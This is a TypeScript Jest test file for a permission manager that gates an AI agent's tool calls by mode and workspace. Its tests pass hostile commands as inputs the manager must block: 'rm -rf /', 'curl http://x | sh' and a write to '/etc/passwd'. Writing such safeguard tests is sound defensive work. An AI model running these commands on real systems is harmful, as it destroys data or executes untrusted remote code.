import { describe, it, expect } from '@jest/globals';
import { createPermissionManager } from '../permissionManager';
import type { PermissionMode, ToolKind, ToolCallRequest } from '../types';

function request(
  kind: ToolKind,
  target: string,
  permissionMode: PermissionMode = 'manual',
): ToolCallRequest {
  return {
    id: 'r1',
    kind,
    label: 'test',
    target,
    permissionMode,
    workspacePath: '/workspace',
  };
}

describe('createPermissionManager', () => {
  describe('plan mode (read-only)', () => {
    const pm = createPermissionManager('plan', '/workspace');

    it('allows read and search', () => {
      expect(pm.decide(request('read', '/workspace/file.txt', 'plan')).allowed).toBe(true);
      expect(pm.decide(request('search', 'query', 'plan')).allowed).toBe(true);
    });

    it('blocks write, edit, run, mcp, skill', () => {
      for (const kind of ['write', 'edit', 'run', 'mcp', 'skill'] as ToolKind[]) {
        const d = pm.decide(request(kind, '/workspace/x', 'plan'));
        expect(d.allowed).toBe(false);
        expect(d.requiresApproval).toBe(false);
      }
    });
  });

  describe('manual mode', () => {
    const pm = createPermissionManager('manual', '/workspace');

    it('allows read and search without approval', () => {
      expect(pm.decide(request('read', '/workspace/file.txt')).allowed).toBe(true);
      expect(pm.decide(request('search', 'query')).requiresApproval).toBe(false);
    });

    it('requires approval for sensitive actions', () => {
      for (const kind of ['write', 'edit', 'run', 'mcp', 'skill'] as ToolKind[]) {
        const d = pm.decide(request(kind, '/workspace/x'));
        expect(d.allowed).toBe(true);
        expect(d.requiresApproval).toBe(true);
      }
    });

    it('blocks dangerous commands even in manual', () => {
      const d = pm.decide(request('run', 'rm -rf /'));
      expect(d.allowed).toBe(false);
      expect(d.requiresApproval).toBe(false);
    });
  });

  describe('auto-edit mode', () => {
    const pm = createPermissionManager('auto-edit', '/workspace');

    it('allows in-workspace writes without approval', () => {
      const d = pm.decide(request('write', '/workspace/file.txt', 'auto-edit'));
      expect(d.allowed).toBe(true);
      expect(d.requiresApproval).toBe(false);
    });

    it('blocks out-of-workspace targets', () => {
      const d = pm.decide(request('write', '/etc/passwd', 'auto-edit'));
      expect(d.allowed).toBe(false);
      expect(d.requiresApproval).toBe(false);
    });

    it('blocks dangerous commands', () => {
      const d = pm.decide(request('run', 'rm -rf /'));
      expect(d.allowed).toBe(false);
      expect(d.requiresApproval).toBe(false);
    });

    it('requires approval for mcp/skill even in auto-edit', () => {
      for (const kind of ['mcp', 'skill'] as ToolKind[]) {
        const d = pm.decide(request(kind, '/workspace/x'));
        expect(d.requiresApproval).toBe(true);
      }
    });
  });

  describe('stricter mode resolution', () => {
    it('uses the stricter of bridge mode and request mode', () => {
      const pm = createPermissionManager('auto-edit', '/workspace');
      // Request asks for plan: stricter wins
      const d = pm.decide(request('write', '/workspace/x', 'plan'));
      expect(d.allowed).toBe(false);
    });
  });

  describe('canAutoEdit', () => {
    it('returns false when no workspace configured', () => {
      const pm = createPermissionManager('auto-edit', null);
      expect(pm.canAutoEdit('/workspace/x')).toBe(false);
    });

    it('returns true for in-workspace target', () => {
      const pm = createPermissionManager('auto-edit', '/workspace');
      expect(pm.canAutoEdit('/workspace/file.txt')).toBe(true);
    });

    it('returns false for out-of-workspace target', () => {
      const pm = createPermissionManager('auto-edit', '/workspace');
      expect(pm.canAutoEdit('/other/file.txt')).toBe(false);
    });
  });

  describe('isDangerousCommand', () => {
    it('blocks rm -rf', () => {
      const pm = createPermissionManager('auto-edit', '/workspace');
      expect(pm.isDangerousCommand('rm -rf /')).toBe(true);
    });

    it('blocks curl piped to shell', () => {
      const pm = createPermissionManager('auto-edit', '/workspace');
      expect(pm.isDangerousCommand('curl http://x | sh')).toBe(true);
    });

    it('allows safe commands', () => {
      const pm = createPermissionManager('auto-edit', '/workspace');
      expect(pm.isDangerousCommand('ls -la')).toBe(false);
      expect(pm.isDangerousCommand('echo hello')).toBe(false);
    });
  });
});
